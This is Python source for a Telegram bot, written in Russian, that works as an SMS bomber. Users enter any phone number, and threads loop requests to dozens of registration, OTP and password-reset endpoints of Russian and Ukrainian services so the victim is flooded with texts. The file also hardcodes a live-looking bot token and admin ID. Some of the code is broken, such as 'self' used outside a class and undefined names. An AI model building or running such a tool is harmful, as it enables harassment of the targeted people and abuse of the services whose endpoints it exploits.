# -*- coding: utf-8 -*-
import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time
import random

TOKEN = '1084748785:AAFtDTbhKtPTAVJptxmaJF3DHYpnol1wTN0'

THREADS_LIMIT = 200

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 1064703960

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

print('Bot has started! You can use him.')

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='🥶Флуд Смс')
    stop = types.KeyboardButton(text='Остановить флуд')
    info = types.KeyboardButton(text='🤖Информация')
    stats = types.KeyboardButton(text='📈Статистика')
    faq = types.KeyboardButton(text='❗️ FAQ / Соглашение')

    buttons_to_add = [boom, stop, info, stats, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='🔥Рассылка'))
        buttons_to_add.append(types.KeyboardButton(text='addbl'))
        buttons_to_add.append(types.KeyboardButton(text='delbl'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, 'Добро пожаловать🙋‍♂!\n\n<b>В данном боте ты сможешь зафлудить любой номер телефона!</b>\n\n<b>Выберите действие:</b>',  reply_markup=keyboard, parse_mode='HTML')
    save_chat_id(message.chat.id)

iteration = 0
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

def send_for_number(phone):
        request_timeout = 0.00001
        iteration = 0
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        _phone = phone
        self.formatted_phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
        while True:
            try:
                requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9})
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
                requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
                requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
                requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
                requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
                requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
                requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
                requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + self.formatted_phone})
                requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + self.formatted_phone, "api": 2, "email": "email","x-email": "x-email"})                
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + self.formatted_phone})
                requests.post('https://plink.tech/register/',json={"phone": self.formatted_phone})
                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": self.formatted_phone})
                requests.post("http://smsgorod.ru/sendsms.php",data={"number": self.formatted_phone})
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': self.formatted_phone})
                requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": self.formatted_phone,"username": username})
                requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': self.formatted_phone},headers={'App-ID': 'cabinet'})
                requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": self.formatted_phone, "type": 2})
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + self.formatted_phone})
                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": self.formatted_phone})
                requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": self.formatted_phone})
                requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': self.formatted_phone})
                requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": self.formatted_phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                requests.get('https://findclone.ru/register', params={'phone': '+' + self.formatted_phone})
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + self.formatted_phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
                requests.post('https://youdo.com/api/verification/sendverificationcode/', data={'PhoneE164':_phone})
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": 'Porno22!', "application": "lkp", "login": "+" + _phone})
                requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
                requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': _phone})
                # Ukraine
                requests.post('https://tehnosvit.ua/iwantring_feedback.html', data={'feedbackName':_name,'feedbackPhone':'+'+_phone})
                requests.post('https://mobileplanet.ua/register', data={'klient_name':_nameRu,'klient_phone':'+'+_phone,'klient_email':_email})
                requests.post('https://protovar.com.ua/aj_record', data={'object':'callback','user_name':_nameRu,'contact_phone':_phone[3:]})
                requests.post('https://e-vse.online/mail2.php', data={'telephone':'+'+_phone})
                requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', data={'firstname':_name, 'telephone':_phone[2:], 'email':_email,'password':password,'form_key':'Zqqj7CyjkKG2ImM8'})
                requests.post('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B'+_phone[0:7]+'-'+_phone[8:11])
                requests.post('https://707taxi.com.ua/sendSMS.php', data={'tel': _phone[3:]})
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
                requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,'registration_phone':_phone[2:],'registration_email':_email})
                requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
                requests.post('https://my.citrus.ua/api/v2/register',data={"email":_email,"name":_name,"phone":_phone[2:],"password":'fgfg',"confirm_password":'fgfg'})
                requests.post('https://www.nl.ua', data={'component':'bxmaker.authuserphone.login', 'sessid':'bf70db951f54b837748f69b75a61deb4', 'method':'sendCode','phone':_phone,'registration':'N'})
                iteration += 1
            except:
                pass

@bot.message_handler(commands=["addbl"])
def addbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            newloser = f'{message.text[7:]}'
            if newloser == '':
                bot.send_message(ADMIN_CHAT_ID, "Введите номер id пользователя")
            else:
                f = open('idBL.txt' , 'a')
                f.write(f'{newloser}' + '\n')
                f.close()
                bot.send_message(ADMIN_CHAT_ID, "Добавлен новый пользователь в черный лист: "+f'{newloser}')
        else:
            bot.send_message(message.chat.id, "Доступно только админу")
    except:
        pass

@bot.message_handler(commands=['delbl'])
def delbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            idunban = f'{message.text[7:]}'
            with open("idBL.txt") as file:
                arrayBL = [row.strip() for row in file]
                if idunban == '':
                    bot.send_message(ADMIN_CHAT_ID, "Введите id пользователя.")
                elif idunban in arrayBL:
                    sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
                    f = open('idBL.txt', 'w')
                    f.write(sss)
                    f.close()
                    bot.send_message(ADMIN_CHAT_ID, 'Готово.')
                else:
                    bot.send_message(ADMIN_CHAT_ID, 'Такого юзера не найдено')
        else:
            bot.send_message(message.chat.id, "Доступно только админу")
    except:
        pass

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    bot.send_message(chat_id, "Проверяем черный список...")
    with open("idBL.txt") as file:
        arrayBL = [row.strip() for row in file]
        iduser = f'{chat_id}'
    if iduser in arrayBL:
        bot.send_message(chat_id, "Вы в черном листе!\nЕсли Вы считаете, что бан был получен случайно - обращайтесь к @san_riched.\nВот Ваш id, он пригодится админу: <b>"+f'{chat_id}'+"</b>", parse_mode="HTML")
    else:
        bot.send_message(ADMIN_CHAT_ID, f"{chat_id} отправил спам на {phone_number}", parse_mode='HTML')


    bot.send_message(chat_id, f'<b>👨‍💻Номер телефона: {phone_number}\n🙈Таймер: 2 минуты\n😄Спам успешно начался!</b>\n\nВ конце, вам придет отчет о спаме.', parse_mode='HTML')
    end = datetime.now() + timedelta(minutes = 2)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'<b>Спам на номер {phone_number} завершён</b>', parse_mode='HTML')
    THREADS_AMOUNT[0] -= 1 # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Остановить спам и поробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
        print('Максимальное количество тредов исполняется. Действие отменено.')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == '🤖Информация':
        bot.send_message(chat_id, 'Создатель бота: @san_riched\n<b>spamm3r bot\n\nПо вопросам сотрудничества обращаться в ЛС к создателю бота\n\n Канал создателя скрипта: @codingbots</b>', parse_mode='HTML')

    elif text == '🥶Флуд Смс':
        bot.send_message(chat_id, '<b>Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx\n🇧🇾 375xxxxxxxxx</b>', parse_mode='HTML')

    elif text == '📈Статистика':
        bot.send_message(chat_id, f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users_amount[0]}<b>\nОбщее кол-во сервисов: 67\nБот запущен: 04.02.2020</b>', parse_mode='HTML')

    elif text == '🔥Рассылка' and chat_id==ADMIN_CHAT_ID:
        bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

    elif text == '❗️ FAQ / Соглашение':
        bot.send_message(chat_id, 'Вы автоматически отвечаете за свои действия с этим ботом. Мы не несем ответственности, только тестирование! Спасибо за внимание.')

    elif text == 'Остановить флуд':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Флуд еще не начинался')
        else:
            running_spams_per_chat_id.remove(chat_id)

    elif text == 'addbl':
        addbl(message)

    elif text == 'delbl':
        delbl(message)

    elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ","")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
        print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')

if __name__ == '__main__':
    bot.polling(none_stop=True)
